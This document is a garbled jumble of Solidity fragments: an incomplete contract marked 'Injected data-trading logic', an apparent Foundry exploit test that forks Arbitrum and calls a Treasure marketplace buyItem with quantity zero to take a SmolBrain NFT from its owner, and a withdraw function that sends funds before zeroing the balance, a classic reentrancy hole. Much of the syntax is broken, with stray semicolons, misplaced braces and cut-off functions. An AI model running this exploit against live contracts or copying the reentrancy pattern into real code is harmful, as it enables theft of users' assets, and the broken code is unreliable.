
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity 0.8.10;

;
```solidity;

;
;
contract ContractTest is DSTest {
  ITreasureMarketplaceBuyer itreasure =;
    ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);
  IERC721 iSmolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);
  uint256 tokenId = 3557;
  address nftOwner;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("arbitrum", 7322694)};
  function testExploit() public {
    nftOwner = iSmolBrain.ownerOf(tokenId);
    emit log_named_address("Original NFT owner of SmolBrain:", nftOwner);
    itreasure.buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, nftOwner, 0, 1);
    emit log_named_address("Exploit completed, NFT owner of SmolBrain:", iSmolBrain.ownerOf(tokenId))};
  function onERC721Received(address,
    address,
    uint256,
function depositETH(address payable locker) public {
    (bool sent, ) = locker.call{value: 1 ether}("");
    require(sent)}
mapping(address => uint256) public balances;
function withdraw() public {
    if (balances[msg.sender] > 0) {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent);
        balances[msg.sender] = 0}